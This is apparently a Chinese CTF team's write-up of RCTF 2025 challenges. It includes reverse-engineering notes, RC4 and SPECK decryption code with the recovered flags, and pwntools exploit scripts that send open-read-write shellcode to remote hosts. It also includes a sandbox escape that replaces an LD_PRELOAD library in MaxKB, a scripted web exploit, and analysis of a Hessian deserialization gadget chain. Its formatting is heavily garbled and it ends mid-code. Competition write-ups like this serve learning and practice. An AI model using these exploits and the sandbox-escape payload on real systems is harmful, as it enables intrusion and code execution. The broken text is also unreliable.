00401116 mov byte ptr [ecx],69h ;'i'

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040124A loc_40124A:.text:
0040124A mov ebx,22222222h.text:
0040124F call ds:
GetCurrentProcess.text:
00401255 mov [ebp-10h], eax.text:
00401258 push 0.text:
0040125A push 4.text:
0040125C lea eax, [ebp-8] ; 输出句柄位置.text:
0040125F push eax.text:
00401260 push 7 ; ProcessInformationClass =7.text:
00401262 mov ecx, [ebp-10h].text:
00401265 push ecx ; ProcessHandle.text:
00401266 call dword ptr [ebp+8] ; NtQueryInformationProcess.text:
00401269 mov dword_404408,0Eh.text:
00401273 cmp dword ptr [ebp-8],0.text:
00401277 jz short loc_40127B ; ==0则改 key.text:
00401279 jmp short loc_40128A.text:
0040127B loc_40127B:.text:
0040127B mov edx, dword_40440C.text:
00401281 add edx, dword_404408 ; +0x0E.text:
00401287 mov byte ptr [edx],49h ;'I'

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040130D loc_40130D:.text:
0040130D mov ebx,22222222h.text:
00401312 push offset aNtdllDll_0 ;"Ntdll.dll".text:
00401317 call ds:
LoadLibraryW.text:
0040131D mov [ebp-24h], eax.text:
00401320 cmp dword ptr [ebp-24h],0.text:
00401324 jnz short loc_401328.text:
00401326 jmp short loc_401383.text:
00401328loc_401328:.text:
00401328 mov dword_404408,11h.text:
00401332 push offset aNtclose ;"NtClose".text:
00401337 mov eax, [ebp-24h].text:
0040133A push eax.text:
0040133B call ds:
GetProcAddress ; 取 NtClose 地址到 [ebp-28h].text:
00401341 mov [ebp-28h], eax.text:
00401344 cmp dword ptr [ebp-28h],0.text:
00401348 jnz short loc_40134C.text:
0040134A jmp short loc_401383.text:
0040134C loc_40134C:.text:
0040134C mov dword ptr [ebp-4],0.text:
00401353 push 99999999h.text:
00401358 call dword ptr [ebp-28h] ;NtClose(0x99999999).text:
0040135B mov dword ptr [ebp-4],0FFFFFFFEh.text:
00401362 jmp short loc_401383

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040136A sub_40136A proc near ; SEH handler.text:
0040136A mov esp, [ebp-18h].text:
0040136D mov ecx, dword_40440C.text:
00401373 add ecx, dword_404408 ; +0x11.text:
00401379 mov byte ptr [ecx],6Fh ;'o'.text:
0040137C mov dword ptr [ebp-4],0FFFFFFFEh

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004013EA loc_4013EA:.text:
004013EA mov ebx,22222222h.text:
004013EF call ds:
GetCurrentProcess.text:
004013F5 mov [ebp-10h], eax.text:
004013F8 push 0.text:
004013FA push 4.text:
004013FC lea eax, [ebp-8].text:
004013FF push eax.text:
00401400 push 1Fh ; infoclass=0x1F(ProcessDebugFlags).text:
00401402 mov ecx, [ebp-10h].text:
00401405 push ecx.text:
00401406 call dword ptr [ebp+8] ; NtQueryInformationProcess.text:
00401409 mov dword_404408,12h.text:
00401413 cmp dword ptr [ebp-8],1.text:
00401417 jz short loc_40141B.text:
00401419 jmp short loc_40142A.text:
0040141B loc_40141B:.text:
0040141B mov edx, dword_40440C.text:
00401421 add edx, dword_404408 ; +0x12.text:
00401427 mov byte ptr [edx],6Fh ;'o'

ounter(lineflag:{ThisflagIsGoods}

ounter(lineounter(lineounter(lineounter(linepush80h ; key 长度0x80push[ebp-190h] ; key 指针 = dword_40440Cpush&statecall sub_4017D0

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004017D0 sub_4017D0 proc near....text:
004017E4 mov eax, [ebp+arg_0].text:
004017E7 mov byte ptr [eax+101h],0 ; j =0.text:
004017EE mov ecx, [ebp+arg_0].text:
004017F1 mov byte ptr [ecx+100h],0 ; i =0.text:
004017F8 mov [ebp+var_4],0.text:
004017FF jmp short loc_40180A.text:
0040180A loc_40180A: ; 初始化 S[i] = i.text:
0040180A cmp [ebp+var_4],100h.text:
00401811 jnb short loc_401820.text:
00401813 mov eax, [ebp+arg_0].text:
00401816 add eax, [ebp+var_4].text:
00401819 mov cl, byte ptr [ebp+var_4].text:
0040181C mov [eax], cl....text:
00401820loc_401820: ; KSA 主循环.text:
00401820 mov [ebp+var_4],0....text:
00401832loc_401832:.text:
00401832 cmp [ebp+var_4],100h.text:
00401839 jnb short loc_40189A.text:
0040183B mov eax, [ebp+arg_0].text:
0040183E add eax, [ebp+var_4].text:
00401841 movzx ecx, byte ptr [eax].text:
00401844 mov [ebp+var_10], ecx ; S[i].text:
00401847 mov edx, [ebp+arg_4].text:
0040184A add edx, [ebp+var_C] ; key[j].text:
0040184D movzx eax, byte ptr [edx].text:
00401850 add eax, [ebp+var_10].text:
00401853 add eax, [ebp+var_8].text:
00401856 mov [ebp+var_8], eax ; j += S[i] + key[i%keylen].text:
00401859 mov ecx, [ebp+var_8].text:
0040185C and ecx,0FFh.text:
00401862 mov [ebp+var_8], ecx ; j &=0xFF...; 然后交换 S[i], S[j]

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
004018A6 mov eax, [ebp+arg_0].text:
004018A9 mov [ebp+var_4], eax ; S base.text:
004018AC mov ecx, [ebp+arg_0].text:
004018AF movzx edx, byte ptr [ecx+100h].text:
004018B6 mov [ebp+var_8], edx ; i.text:
004018B9 mov eax, [ebp+arg_0].text:
004018BC movzx ecx, byte ptr [eax+101h].text:
004018C3 mov [ebp+var_C], ecx ; j....text:
004018D5 cmp [ebp+var_18],0.text:
004018D9 jz short loc_401955 ; 长度耗尽结束.text:
004018DB mov ecx, [ebp+var_8].text:
004018DE add ecx,1.text:
004018E1 and ecx,0FFh.text:
004018E7 mov [ebp+var_8], ecx ; i = (i+1)&0xFF.text:
004018EA mov edx, [ebp+var_4].text:
004018ED add edx, [ebp+var_8].text:
004018F0 movzx eax, byte ptr [edx].text:
004018F3 mov [ebp+var_10], eax ; S[i].text:
004018F6 mov ecx, [ebp+var_C].text:
004018F9 add ecx, [ebp+var_10].text:
004018FC and ecx,0FFh.text:
00401902 mov [ebp+var_C], ecx ; j = (j+S[i])&0xFF...; 交换 S[i], S[j]，然后：.text:
00401927 mov edx, [ebp+var_10].text:
0040192A add edx, [ebp+var_14].text:
0040192D and edx,0FFh.text:
00401933 mov eax, [ebp+var_4].text:
00401936 movzx ecx, byte ptr [eax+edx] ; S[(S[i]+S[j])&0xFF].text:
0040193A mov edx, [ebp+arg_4].text:
0040193D movzx eax, byte ptr [edx].text:
00401940 xor eax, ecx ; data ^= K.text:
00401942 mov ecx, [ebp+arg_4].text:
00401945 mov [ecx], al.text:
00401947 mov edx, [ebp+arg_4].text:
0040194A add edx,1.text:
0040194D mov [ebp+arg_4], edx ; data++.text:
00401950 jmp loc_4018C6 ; 继续下一个字节

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linekey_str =b"flag:{ThisflagIsGoods}"KEY_LEN =0x80key =bytearray(key_str +b"x00"* (KEY_LEN -len(key_str)))cipher =bytes([ 0x0f,0x1a,0x8a,0x5a,0x22,0xab,0x1e,0x63, 0x19,0x5a,0x87,0xf2,0xe6,0xe9,0xd7,0xd1, 0x97,0xf9,0xf8,0x32,0x5b,0xde,0x2d,0xd6, 0xa3,0x4f,0x7e,0xcb,0x61,0xb2,0x3f,0xbf, 0xb7,0x1b,0x0a,0x84,0xb3,0xb4,0xde,0x03, 0x46,0x7b,0x83,0x2a,0x51,0x73,0xe0,0x7c, 0x93,0x27,0x44,0x9c,0x56,0x8f,0x75,0xfa, 0xa0,0x79,0x26,0xda,0x08,0x01,0x85,0x66, 0x7d,0xbb,0xee,0x0f,0x89,0x59,0xd4,0x5f, 0xac,0x18,0xae,0x0b,0x4e,0xf0,0xb7,0xdd, 0xdd,0x55,0x4b,0xea,0x07,0x92,0x5c,0x8a, 0x53,0xf3,0xff,0xf7,0xa7,0xdd,0x2e,0xe6, 0xed,0x0f,0x77,0x2c,0x4a,0x22,0xf1,0x36, 0x4f,0xa7,0x55,0x5e,0x3e,0x93,0xa4,0x34, 0x29,0x67,0xfc,0x23,0x79,0x19,0xd8,0xc9, 0x2b,0xcf,])defrc4_ksa(key_bytes): S =list(range(256)) j =0 keylen =len(key_bytes) foriinrange(256): j = (j + S[i] + key_bytes[i % keylen]) &0xFF S[i], S[j] = S[j], S[i] returnSdefrc4_prga(S, data): i = j =0 out =bytearray() forbindata: i = (i +1) &0xFF j = (j + S[i]) &0xFF S[i], S[j] = S[j], S[i] k = S[(S[i] + S[j]) &0xFF] out.append(b ^ k) returnbytes(out)S = rc4_ksa(key)plain = rc4_prga(S, cipher)print(plain)"""b'RCTF{AntiDbg_Reversing_2025_v2.0_Ch4llenge}xdax95xc0Kx07xbax9b[bxdcxf6S xa8xxa3xbcuxbakixf4xe2:P%AzTxe2xe8x19x0ex12qxb3ByIx16Jxbex95xcexd6xd9xa0x0cx08Pzxf3xc8x0bxe2x[fhxd3xc7yxe8xf2xb03Exa0G|9xc2xb0xdd-xf1xaexd7xec'"""

从log中提取关键值。

还原解密代码

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line00010223	.text:
vm_execute+A96 mov rax, [rax+rcx] RAX=48F0E6421AC66DEA00010223	.text:
vm_execute+60B mov rcx, [rsp+rdi*8+328h+s] RCX=48F0E6421AC66DEA 00010223	.text:
vm_execute+613 mov rdx, rcx RDX=48F0E6421AC66DEA key0 =0x36B1CC9FE433713D 提取于：00010223	.text:
vm_execute:
loc_55555556BE01	mov rax, [rax+rcx];opcode 0x18: MOV reg, [BP+addr] - 从内存[BP+offset]加载到寄存器	RAX=36B1CC9FE433713Dkey1 =0xF97646D69C84EBD8 提取于：00010223	.text:
vm_execute:
loc_55555556BE01	mov rax, [rax+rcx];opcode 0x18: MOV reg, [BP+addr] - 从内存[BP+offset]加载到寄存器	RAX=F97646D69C84EBD8

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#include<stdio.h>#include<stdint.h>// 32位循环移位uint32_tror32(uint32_tv,ints) { s &=31;return(v >> s) | (v << (32- s)); }uint32_trol32(uint32_tv,ints) { s &=31;return(v << s) | (v >> (32- s)); }// speck解密uint64_tvm_tea_decrypt(uint64_tinput) { uint32_tv0 = input &0xFFFFFFFF; uint32_tv1 = (input >>32) &0xFFFFFFFF; uint32_tkeys[27]; uint32_tr2 =0xE433713D, r3 =0x36B1CC9F, r4 =0x9C84EBD8, r5 =0xF97646D6; for(inti =0; i <27; i++) { keys[i] = r2; if(i <26) { uint32_tt0 =ror32(r3,8) + r2; t0 ^= i; uint32_tt1 =rol32(r2,3) ^ t0; r2 = t1; r3 = r4; r4 = r5; r5 = t0; } } for(inti =26; i >=0; i--) { v1 ^= v0; v1 =ror32(v1,3); v0 ^= keys[i]; v0 -= v1; v0 =rol32(v0,8); } return((uint64_t)v1 <<32) | v0;}// reverseuint64_treverse_xor(uint64_tv) { v ^=0x8CB331163A92FC19ULL; v +=0x5566488C9C5CF234ULL; v ^=0x5074D85B9194E696ULL; v +=0x48F0E6421AC66DEAULL; returnv;}intmain() { uint64_ttarget =0xDA19BA6B81C83F61ULL; uint64_tafter_tea =vm_tea_decrypt(target); printf("TEA dec: 0x%016llxn", after_tea); uint64_tresult =reverse_xor(after_tea); printf("Result: 0x%016llx (%llu)n", result, result); return0;}

ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineba610b6c5d80c91abf11b34d0ce941cca28f38bd0463522c79ed5d84199dd9cb4d9c56b2a1d77a0dfe13c54ceb12fea8494a63fc85b9953aad1f6be84bbb4680cd05f91609d653fa55493aa141fbe86f25bc9aff736b80a8d8817dda43824d2c5fcca9a9cb65130d6f3ed35da24dacfab5e1534e1dc36c87ac1b4e2750778a01c8f82d07316dcd3b36646367b78c2f919eed7637cd5eaa26ff546a0085041459ef320f9e6ae315201e00a4b9e25488f61a9a0626a035fb9de2f1eb0e5248cd2c8a0bf5239eed75c4749e8082db34037df4d25540ed584887c12422512500c8877e1a125dcfa56359497cff13eaa5bf76d51ceddab7795459a922933b0b315a10cabd557ffa1df043e0459b855188d04582700d6f6a986873c01552dff3a12f670615548ece7312fb0e189fa8296579138d4c8f2124957228451572c65bcb3425554fca602792e8794f749f6bbca2014cb1e1adc831c8d5679c73a6d3f711e66e2ab305ec4e07b0b498a16d274bb044d2c409de0e72c1029e5e68e47d3a360a80a1570f48caceb3ddd6ab1c9a18ebb936RCTF{VM_ALU_SMC_RC4_SPECK!_593eb6079d2da6c187ed462b033fee34}

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Neko205


```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linefrompwnimport*fromstructimport*#p = process('./pwn')p = remote('101.245.98.115',26100)context(arch='amd64',log_level='debug',os='linux')p.recvuntil("3.exitn")p.sendline("2")p.recvuntil("input:n")packed_bytes = struct.pack('<Q',0x0D0E0A0D0B0E0E0F)the_double = struct.unpack('<d', packed_bytes)[0]p.sendline(str(the_double))p.sendlineafter('Make a choice:',"1")p.recvuntil("your code:")shellcode ="""pop rdxpop rdxpop rdxpop rsipop rsipop rsisyscall"""shellcode = asm(shellcode)p.send(shellcode)shellcode = asm("""push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall""")payload =b'a'*0x32 + shellcodep.send(payload)p.interactive()
ounter(lineounter(lineounter(lineounter(lineounter(lineaddrsp,0x12345678addrbp,0x12345678// shellcodesub rsp,0x12345678sub rbp,0x12345678
ounter(lineounter(lineounter(lineounter(linesyscall //0f05movrsi, rcx //4889cemovdl,0xff //b2 ffsyscall //0f05
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linesubrbp,0x12345678subrsp,0x12345678push0x67616c66movrdi,rspxorrsi,rsimovrax,2syscallmovrdi,raxmovrsi,rspmovrdx,0x50xorrax,raxsyscallmovrdi,1movrsi,rspmovrdx,0x50movrax,1syscall
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#!/usr/bin/env python3
# -*- coding: utf-8 -*-#@file: exp.py#@author: fuchen#@contact: MTM3MjIwMzYwQHFxLmNvbQ==#@created: 2025-11-15#@description: Pwn exploit template for CTF challenges
from pwn import *context(arch='amd64', os='linux', log_level='debug')LOCAL=TrueBINARY="./chal"LIBC="./libc.so.6"HOST="1.95.164.64"PORT=26000defsetup(): ifLOCAL: returnprocess(BINARY) else: returnremote(HOST,PORT)s =lambdadata :p.send(data)sa =lambdadelim,data :p.sendafter(delim, data)sl =lambdadata :p.sendline(data)sla =lambdadelim,data :p.sendlineafter(delim, data)r =lambdanum=4096 :p.recv(num)ru =lambdadelims, drop=False:p.recvuntil(delims, drop)rl =lambda :p.recvline()itr =lambda :p.interactive()uu32 =lambdadata :
u32(data.ljust(4, b' '))uu64 =lambdadata :
u64(data.ljust(8, b' '))uu16 =lambdadata :
u16(data.ljust(2, b' '))uu8 =lambdadata :u8(data)leak =lambdaname,addr :
log.success(f"{name} = {hex(addr)}")dbg =lambdacmd='' :
gdb.attach(p, cmd)defnotes(): sla(b"3.exitn",b"1")defadd(size): sla(b"5.backn",b"1") sla(b"size:",str(size).encode())defdelete(): sla(b"5.backn",b"2")defsave(filename): sla(b"5.backn",b"3") sl(b"filename: ",filename)defedit(): sla(b"5.backn",b"4")defback(): sla(b"5.backn",b"4")defbookkeeping(): sla(b"3.exitn",b"2") sla(b"input:n",str(8.592564544313935e-246).encode())defruncode(content): sla(b"Make a choice:",b"1") sa(b"your code:",content)defgetcanary(): sla(b"Make a choice:",b"2")defexploit(): global p p = setup() elf =ELF(BINARY) libc =ELF(LIBC)ifLIBCelseNone #dbg('b *$rebase(0x1a79)') #pause() bookkeeping() payload = b"x0fx05x48x89xcexb2xffx0fx05" runcode(payload) orw =''' sub rbp,0x12345678 sub rsp,0x12345678 push 0x67616c66 mov rdi,rsp xor rsi,rsi mov rax,2 syscall mov rdi,rax mov rsi,rsp mov rdx,0x50 xor rax,rax syscall mov rdi,1 mov rsi,rsp mov rdx,0x50 mov rax,1 syscall ''' shellcode = b"x48x89xcexb2xffx0fx05"+ asm(orw) sleep(1) sl(shellcode) #pause() itr()if__name__ =="__main__": try: exploit() exceptExceptionase: log.error(f"Exploit failed: {e}") if'p'inglobals(): p.close() raise
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line@@ -188,6+194,9@@ exec({dedent(code)!a}) self.user, ], 'cwd':
self.sandbox_path,+ 'env': {+ 'LD_PRELOAD':f'{self.sandbox_path}/sandbox.so',+ }, 'transport':'stdio', } else:@@ -204,6+213,9@@ exec({dedent(code)!a}) file.write(_code) os.system(f"chown{self.user}:
root{exec_python_file}") kwargs = {'cwd': BASE_DIR}+ kwargs['env'] = {+ 'LD_PRELOAD':f'{self.sandbox_path}/sandbox.so',+ } subprocess_result = subprocess.run( ['su','-s', python_directory,'-c',"exec(open('"+ exec_python_file +"').read())",self.user], text=True,
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linedefpayload(): importbase64 importos malicious_so_b64="xxxx" malicious_data = base64.b64decode(malicious_so_b64) withopen("/opt/maxkb-app/sandbox/sandbox.so","wb")asf: f.write(malicious_data) return"sandbox.so replaced successfully"
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
# path: exploit.pyimportsys, re, uuid, base64, io, requestsdefget(url, s): r = s.get(url, allow_redirects=True) r.raise_for_status() returnr.textdefpost(url, s, data=None, files=None): r = s.post(url, data=data, files=files) r.raise_for_status() returnrdefb64png(): returnbase64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==')defextract_csrf_from_register(html): m = re.search(r'name="csrf_token"s+value="([^"]+)"', html) returnm.group(1)defextract_csrf_from_settings(html): m = re.search(r"const csrfToken = '([^']+)'", html) returnm.group(1)defregister(base, s): html = get(base +'/register', s) token = extract_csrf_from_register(html) email =f'{uuid.uuid4().hex[:8]}@example.com' data = { 'username':'user'+ uuid.uuid4().hex[:6], 'email': email, 'password':'Passw0rd!', 'confirm_password':'Passw0rd!', 'csrf_token': token } r = post(base +'/api/register', s, data=data) j = r.json() ifnotj.get('success'): raiseRuntimeError('register failed: '+str(j)) returnemaildefupload_photo(base, s): png = b64png() f = io.BytesIO(png) files = [('photos[]', ('x.png', f,'-1'))] r = post(base +'/api/photos/upload', s, files=files) j = r.json() ifnotj.get('success')ornotj.get('photos'): raiseRuntimeError('upload failed: '+str(j)) returnj['photos'][0]['id']defset_background(base, s, photo_id): html = get(base +'/settings', s) token = extract_csrf_from_settings(html) data = {'photo_id': photo_id,'csrf_token': token} r = post(base +'/api/user/background', s, data=data) j = r.json() ifnotj.get('success'): raiseRuntimeError('set background failed: '+str(j))defget_flag(base, s): r = s.get(base +'/superadmin.php') ifr.status_code ==200: returnr.text.strip() raiseRuntimeError('flag fetch failed, status: '+str(r.status_code))defmain(): base = sys.argv[1]iflen(sys.argv) >1else'http://1.95.160.41:
26000/' s = requests.Session() register(base, s) pid = upload_photo(base, s) set_background(base, s, pid) flag = get_flag(base, s) print(flag)if__name__ =='__main__': main()
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packagecom.rctf.server.controller;importcom.rctf.server.tool.HessianFactory;importorg.springframework.stereotype.Controller;importorg.springframework.web.bind.annotation.RequestMapping;importorg.springframework.web.bind.annotation.RequestParam;@ControllerpublicclassRCTFController{ @RequestMapping({"/hello"}) publicString hello(@RequestParam(name ="data",required = false)Stringdata) throws Exception { Object obj = HessianFactory.deserialize(data); return"hello"; }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line static{ WHITE_PACKAGES.add("com.rctf.server.tool."); WHITE_PACKAGES.add("java.util."); WHITE_PACKAGES.add("org.apache.commons.logging."); WHITE_PACKAGES.add("org.springframework.beans."); WHITE_PACKAGES.add("org.springframework.jndi."); }
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package com.rctf.server.tool;importjava.io.Serializable;importjava.lang.reflect.InvocationHandler;importjava.lang.reflect.Method;importjava.lang.reflect.Proxy;publicclassMaybeextendsProxyimplementsComparable<Object>,Serializable{ publicMaybe(InvocationHandlerh) { super(h); } publicintcompareTo(Objecto) { try{ Methodmethod =Comparable.class.getMethod("compareTo",Object.class); Objectresult =this.h.invoke(this, method,newObject[]{o}); return(Integer)result; }catch(Throwablee) { thrownewRuntimeException(e); } }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line/***@nameEmpty block*@kindproblem*@problem.severity warning*@idjava/example/empty-block*/importjavaimportlibs.Sourceimportlibs.DangerousMethodsclassInvokerHandlerextendsClass{ InvokerHandler() { this.getASupertype*().getQualifiedName() ="java.lang.reflect.InvocationHandler"and ( this.getQualifiedName().regexpMatch("java.util.+") or this.getQualifiedName().regexpMatch("org.apache.commons.logging.+") or this.getQualifiedName().regexpMatch("org.springframework.beans.+") or this.getQualifiedName().regexpMatch("org.springframework.jndi.+") ) }}classHessianObjectFactoryextendsMethod{ HessianObjectFactory() { // this.getASupertype*().getQualifiedName() = "org.springframework.beans.factory.ObjectFactory" this.getName() ="getObject"and this.hasNoParameters() and ( this.getQualifiedName().regexpMatch("java.util.+") or this.getQualifiedName().regexpMatch("org.apache.commons.logging.+") or this.getQualifiedName().regexpMatch("org.springframework.beans.+") or this.getQualifiedName().regexpMatch("org.springframework.jndi.+") ) }}// from HessianObjectFactory i, DangerousMethod m// where i.calls(m)// select ifrom DangerousMethod mselect m, m.getName()
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line privatestaticclassObjectFactoryDelegatingInvocationHandlerimplementsInvocationHandler,Serializable{ privatefinal ObjectFactory<?> objectFactory; ObjectFactoryDelegatingInvocationHandler(ObjectFactory<?> objectFactory) { this.objectFactory = objectFactory; } publicObjectinvoke(Object proxy, Method method, Object[]args) throws Throwable{ switch(method.getName()) { case"equals": returnproxy ==args[0]; case"hashCode": returnSystem.identityHashCode(proxy); case"toString": returnthis.objectFactory.toString(); default: try{ returnmethod.invoke(this.objectFactory.getObject(),args); }catch(InvocationTargetException ex) { throwex.getTargetException(); } } } }
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packageorg.springframework.beans.factory;importorg.springframework.beans.BeansException;@FunctionalInterfacepublicinterfaceObjectFactory<T> { TgetObject()throwsBeansException;}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packageorg.springframework.beans.factory.config;importjava.io.Serializable;importorg.springframework.beans.BeansException;importorg.springframework.beans.factory.BeanFactory;importorg.springframework.beans.factory.ObjectFactory;importorg.springframework.lang.Nullable;importorg.springframework.util.Assert;publicclassObjectFactoryCreatingFactoryBeanextendsAbstractFactoryBean<ObjectFactory<Object>> { @Nullable privateString targetBeanName; publicvoid setTargetBeanName(String targetBeanName) { this.targetBeanName = targetBeanName; } publicvoid afterPropertiesSet() throws 